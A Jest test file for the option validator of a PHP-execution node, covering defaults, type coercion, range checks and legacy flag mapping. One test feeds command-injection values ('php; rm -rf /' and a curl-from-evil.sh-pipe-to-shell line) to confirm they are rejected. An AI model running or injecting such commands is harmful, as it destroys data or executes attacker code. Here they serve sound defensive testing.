import {
	PhpOptionsValidationError,
	validateNodeOptions,
} from '../helpers/validation';

describe('validateNodeOptions', () => {
	it('applies documented defaults to an empty collection', () => {
		const options = validateNodeOptions({});

		expect(options).toEqual({
			binaryPath: 'php',
			timeoutMs: 30000,
			memoryLimitMb: 128,
			executionMode: 'item-by-item',
			securityLevel: 'restricted',
			strictJsonMode: false,
			composerAutoloadPath: '',
			resultCacheTtlSeconds: 0,
			additionalFiles: [],
		});
	});

	it('accepts valid values and converts timeout to milliseconds', () => {
		const options = validateNodeOptions({
			timeout: 5,
			phpBinaryPath: '/usr/bin/php8.3',
			memoryLimit: 512,
			executionMode: 'batch',
			securityLevel: 'unrestricted',
			strictJsonMode: true,
			composerAutoloadPath: ' /app/vendor/autoload.php ',
			resultCacheTtlSeconds: 120,
			additionalFiles: [{ name: 'helper.php', content: '<?php ...' }],
		});

		expect(options).toMatchObject({
			binaryPath: '/usr/bin/php8.3',
			timeoutMs: 5000,
			memoryLimitMb: 512,
			executionMode: 'batch',
			securityLevel: 'unrestricted',
			strictJsonMode: true,
			composerAutoloadPath: '/app/vendor/autoload.php',
			resultCacheTtlSeconds: 120,
		});
		expect(options.additionalFiles).toEqual([{ name: 'helper.php', content: '<?php ...' }]);
	});

	it('coerces numeric strings coming from expressions', () => {
		const options = validateNodeOptions({ timeout: '45', memoryLimit: '256' });

		expect(options.timeoutMs).toBe(45000);
		expect(options.memoryLimitMb).toBe(256);
	});

	it.each([
		['true', true],
		['false', false],
		[1, true],
		[0, false],
	])('coerces strictJsonMode value %p into %p', (raw, expected) => {
		expect(validateNodeOptions({ strictJsonMode: raw }).strictJsonMode).toBe(expected);
	});

	it('rejects an out-of-range timeout with a readable issue list', () => {
		expect(() => validateNodeOptions({ timeout: 4000 })).toThrow(PhpOptionsValidationError);
		try {
			validateNodeOptions({ timeout: 4000 });
		} catch (error) {
			expect((error as PhpOptionsValidationError).message).toContain('timeout');
		}

		expect(() => validateNodeOptions({ timeout: 0 })).toThrow(/timeout/);
		expect(() => validateNodeOptions({ timeout: 'abc' })).toThrow(/timeout/);
	});

	it('rejects binary paths containing command separators', () => {
		expect(() => validateNodeOptions({ phpBinaryPath: 'php; rm -rf /' })).toThrow(
			/phpBinaryPath/,
		);
		expect(() =>
			validateNodeOptions({ phpBinaryPath: '/usr/bin/php && curl evil.sh | sh' }),
		).toThrow(/phpBinaryPath/);
	});

	it('accepts common absolute and windows-style binary paths', () => {
		expect(() => validateNodeOptions({ phpBinaryPath: '/usr/bin/php8.3' })).not.toThrow();
		expect(() =>
			validateNodeOptions({ phpBinaryPath: 'C:\\Program Files\\php\\php.exe' }),
		).not.toThrow();
	});

	it('rejects out-of-range memory limits and unknown execution modes', () => {
		expect(() => validateNodeOptions({ memoryLimit: 8192 })).toThrow(/memoryLimit/);
		expect(() => validateNodeOptions({ executionMode: 'once-per-week' })).toThrow(
			/executionMode/,
		);
	});

	it('rejects additional files without a usable name and oversized collections', () => {
		expect(() => validateNodeOptions({ additionalFiles: [{ name: '', content: 'x' }] })).toThrow(
			/additionalFiles/,
		);

		const tooMany = Array.from({ length: 51 }, (_, i) => ({ name: `f${i}.php`, content: '' }));
		expect(() => validateNodeOptions({ additionalFiles: tooMany })).toThrow(/additionalFiles/);
	});

	it('maps the legacy Safe Mode flag onto the security level for old workflows', () => {
		expect(validateNodeOptions({ safeMode: true }).securityLevel).toBe('restricted');
		expect(validateNodeOptions({ safeMode: false }).securityLevel).toBe('unrestricted');
	});

	it('prefers an explicit security level over the legacy Safe Mode flag', () => {
		expect(validateNodeOptions({ safeMode: false, securityLevel: 'restricted' }).securityLevel).toBe(
			'restricted',
		);
	});
});
